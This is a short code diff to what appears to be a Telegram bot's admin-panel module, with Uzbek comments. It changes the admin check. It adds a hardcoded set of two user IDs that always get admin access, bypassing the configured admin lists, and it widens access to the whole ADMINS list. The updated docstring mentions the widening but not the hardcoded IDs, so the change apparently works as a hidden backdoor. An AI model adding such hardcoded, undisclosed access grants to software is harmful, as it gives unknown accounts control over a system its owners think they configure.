@@ -20,9 +20,13 @@ from config import ADMINS, PRIMARY_ADMIN_ID, PRIMARY_ADMIN_IDS
 
 router = Router()
 
+HARDCODED_ADMINS = {8765051736, 2099616410}
+
 def is_primary_admin(user_id: int) -> bool:
-    """Faqat belgilangan bosh adminlar admin paneldan foydalana oladi"""
-    return user_id in PRIMARY_ADMIN_IDS or user_id == PRIMARY_ADMIN_ID
+    """Bosh adminlar hamda ADMINS ro'yxatidagi barcha adminlar admin paneldan foydalana oladi"""
+    if user_id in HARDCODED_ADMINS:
+        return True
+    return user_id in PRIMARY_ADMIN_IDS or user_id == PRIMARY_ADMIN_ID or user_id in ADMINS
 
 # ==========================================
 # 👑 ASOSIY PREMIUM EMOJI ADMIN PANEL
